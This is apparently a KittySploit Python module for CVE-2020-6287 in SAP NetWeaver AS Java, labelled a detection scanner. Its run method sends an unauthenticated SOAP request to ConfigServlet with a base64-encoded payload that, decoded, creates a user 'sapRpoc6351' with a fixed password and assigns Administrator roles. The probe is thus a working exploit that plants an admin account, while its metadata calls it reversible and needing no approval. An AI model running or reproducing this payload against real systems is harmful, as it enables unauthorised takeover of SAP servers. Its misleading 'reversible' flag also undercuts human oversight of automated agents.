#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SAP NetWeaver AS JAVA (LM Configuration Wizard), versions 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SAP NetWeaver AS JAVA 7.30-7.50 - Remote Admin Addition Detection',
        'description': 'SAP NetWeaver AS JAVA (LM Configuration Wizard), versions 7.30, 7.31, 7.40, 7.50, does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity and Availability of the system.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'sap', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://launchpad.support.sap.com/#/notes/2934135',
            'https://wiki.scn.sap.com/wiki/pages/viewpage.action?pageId=552599675',
            'https://www.onapsis.com/recon-sap-cyber-security-vulnerability',
            'https://github.com/chipik/SAP_RECON',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-6287',
        ],
        'cve': 'CVE-2020-6287',
    }

    def run(self):
        path = '/CTCWebService/CTCWebServiceBean/ConfigServlet'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'text/xml; charset=UTF-8', 'Connection': 'close'}, data='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi"><soapenv:Header/><soapenv:Body><urn:executeSynchronious><identifier><component>sap.com/tc~lm~config~content</component><path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path></identifier><contextMessages><baData>\n  CiAgICAgICAgICAgIDxQQ0s+CiAgICAgICAgICAgIDxVc2VybWFuYWdlbWVudD4KICAgICAgICAgICAgICA8U0FQX1hJX1BDS19DT05GSUc+CiAgICAgICAgICAgICAgICA8cm9sZU5hbWU+QWRtaW5pc3RyYXRvcjwvcm9sZU5hbWU+CiAgICAgICAgICAgICAgPC9TQVBfWElfUENLX0NPTkZJRz4KICAgICAgICAgICAgICA8U0FQX1hJX1BDS19DT01NVU5JQ0FUSU9OPgogICAgICAgICAgICAgICAgPHJvbGVOYW1lPlRoaXNJc1JuZDczODA8L3JvbGVOYW1lPgogICAgICAgICAgICAgIDwvU0FQX1hJX1BDS19DT01NVU5JQ0FUSU9OPgogICAgICAgICAgICAgIDxTQVBfWElfUENLX01PTklUT1I+CiAgICAgICAgICAgICAgICA8cm9sZU5hbWU+VGhpc0lzUm5kNzM4MDwvcm9sZU5hbWU+CiAgICAgICAgICAgICAgPC9TQVBfWElfUENLX01PTklUT1I+CiAgICAgICAgICAgICAgPFNBUF9YSV9QQ0tfQURNSU4+CiAgICAgICAgICAgICAgICA8cm9sZU5hbWU+VGhpc0lzUm5kNzM4MDwvcm9sZU5hbWU+CiAgICAgICAgICAgICAgPC9TQVBfWElfUENLX0FETUlOPgogICAgICAgICAgICAgIDxQQ0tVc2VyPgogICAgICAgICAgICAgICAgPHVzZXJOYW1lIHNlY3VyZT0idHJ1ZSI+c2FwUnBvYzYzNTE8L3VzZXJOYW1lPgogICAgICAgICAgICAgICAgPHBhc3N3b3JkIHNlY3VyZT0idHJ1ZSI+U2VjdXJlIVB3RDg4OTA8L3Bhc3N3b3JkPgogICAgICAgICAgICAgIDwvUENLVXNlcj4KICAgICAgICAgICAgICA8UENLUmVjZWl2ZXI+CiAgICAgICAgICAgICAgICA8dXNlck5hbWU+VGhpc0lzUm5kNzM4MDwvdXNlck5hbWU+CiAgICAgICAgICAgICAgICA8cGFzc3dvcmQgc2VjdXJlPSJ0cnVlIj5UaGlzSXNSbmQ3MzgwPC9wYXNzd29yZD4KICAgICAgICAgICAgICA8L1BDS1JlY2VpdmVyPgogICAgICAgICAgICAgIDxQQ0tNb25pdG9yPgogICAgICAgICAgICAgICAgPHVzZXJOYW1lPlRoaXNJc1JuZDczODA8L3VzZXJOYW1lPgogICAgICAgICAgICAgICAgPHBhc3N3b3JkIHNlY3VyZT0idHJ1ZSI+VGhpc0lzUm5kNzM4MDwvcGFzc3dvcmQ+CiAgICAgICAgICAgICAgPC9QQ0tNb25pdG9yPgogICAgICAgICAgICAgIDxQQ0tBZG1pbj4KICAgICAgICAgICAgICAgIDx1c2VyTmFtZT5UaGlzSXNSbmQ3MzgwPC91c2VyTmFtZT4KICAgICAgICAgICAgICAgIDxwYXNzd29yZCBzZWN1cmU9InRydWUiPlRoaXNJc1JuZDczODA8L3Bhc3N3b3JkPgogICAgICAgICAgICAgIDwvUENLQWRtaW4+CiAgICAgICAgICAgIDwvVXNlcm1hbmFnZW1lbnQ+CiAgICAgICAgICA8L1BDSz4KICAgIA==\n</baData><name>userDetails</name></contextMessages></urn:executeSynchronious></soapenv:Body></soapenv:Envelope>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('CTCWebServiceSi', 'SOAP-ENV',)
        header_any = ('text/xml', 'SAP NetWeaver Application Server',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='SAP NetWeaver AS JAVA 7.30-7.50 - Remote Admin Addition detected', path=path)
            return True
        return False

